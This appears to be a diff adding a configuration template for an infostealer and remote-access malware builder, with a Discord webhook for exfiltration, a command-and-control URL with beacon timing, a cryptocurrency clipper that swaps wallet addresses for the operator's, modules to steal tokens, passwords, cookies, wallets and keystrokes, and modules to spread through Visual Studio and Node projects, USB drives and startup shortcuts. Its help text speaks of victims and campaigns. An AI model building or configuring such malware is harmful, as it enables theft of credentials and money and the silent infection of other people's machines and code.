@@ -1,0 +1,44 @@
+{
+  "_help": "Copy to config.json and fill. Builder bakes this INTO each build. Victim never sees this file.",
+  "OWNER_KEY": "op-change-me-30-chars-000001",
+  "DISCORD_WEBHOOK": "https://discord.com/api/webhooks/PUT_ID/PUT_TOKEN",
+  "DISCORD_BOT_TOKEN": "",
+  "DISCORD_CHANNEL_ID": "",
+  "C2_URL": "http://127.0.0.1:8080",
+  "MODE": "both",
+  "BEACON_MIN": 25,
+  "BEACON_MAX": 90,
+  "_mode_help": "webhook = exfil only via Discord, no inbound. http = poll C2_URL for tasks (needs portforward). both = webhook exfil + http tasks (recommended). Bot token+channel adds Discord task fallback.",
+  "CLIPPER": {
+    "BTC": "bc1q-operator-btc-here",
+    "ETH": "0x-operator-eth-here",
+    "LTC": "ltc1-operator-ltc-here",
+    "XMR": "4-operator-xmr-here",
+    "DOGE": "D-operator-doge-here",
+    "SOL": "operator-sol-here",
+    "TRX": "T-operator-trx-here",
+    "XRP": "r-operator-xrp-here"
+  },
+  "_payout_help": "Empty string disables that coin. Also accepted as PAYOUT alias. Update live later via C2 /admin/clip without rebuilding.",
+  "STEAL": {
+    "tokens": true,
+    "passwords": true,
+    "cookies": true,
+    "history": true,
+    "autofill": true,
+    "wallets": true,
+    "wifi": true,
+    "screenshot": true,
+    "keylog": true,
+    "files": true
+  },
+  "SPREAD": {
+    "vcxproj": true,
+    "csproj": true,
+    "node_project": true,
+    "scripts": true,
+    "usb": true,
+    "startup_lnk": true
+  },
+  "_modules_help": "false disables that module for this campaign. You can also use single MODULES:{clipper:false} style. Clipper on/off = set all CLIPPER empty vs filled, or MODULES clipper handling via STEAL/SPREAD above."
+}
